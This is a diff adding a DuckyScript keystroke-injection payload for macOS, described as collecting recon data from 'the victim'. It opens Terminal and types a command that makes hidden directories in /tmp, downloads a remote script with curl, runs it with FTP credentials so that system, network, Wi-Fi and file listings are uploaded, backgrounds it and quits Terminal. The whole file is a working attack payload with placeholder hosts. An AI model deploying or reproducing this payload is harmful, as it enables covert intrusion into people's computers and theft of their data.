@@ -1,0 +1,31 @@
+REM Title: MacOS local recon script
+REM Author: un1x01d
+REM Description: Collects important recon information from the victim. Includes: OS, Hardware, Network, Filesystem, Wifi etc..
+REM Target: MacOS 10.0+
+REM Version: 1.0
+REM Notes: The results will be uploaded to a FTP server.
+REM Notes: FTP is NOT a secure protocol and can be captured very easily, this payload should not be used over public or unauthorized networks. 
+REM Notes: Part of the script is to generate a list of all the files in the home directory, dependeing on the amount of files the size of the list will change. Which might take longer to upload. 
+
+DELAY 500
+GUI SPACE
+DELAY 500
+STRING Terminal
+ENTER
+REM DELAY 500
+REM STRING osascript -e 'tell application "Terminal" to set bounds of front window to {2500, 50, 50, 50}'
+REM DELAY 500
+REM ENTER
+
+DELAY 300
+
+STRING mkdir -p /tmp/.p/.w/.n/.d ; curl -s "<URL TO SCRIPT>" -o /tmp/.p/.w/.n/.d/.mlr && bash /tmp/.p/.w/.n/.d/.mlr <FTP SERVER>  <USERNAME> <PASSWORD> & disown
+DELAY 100
+ENTER
+
+DELAY 300
+GUI q
+DELAY 500
+ENTER
+DELAY 200
+GUI TAB 
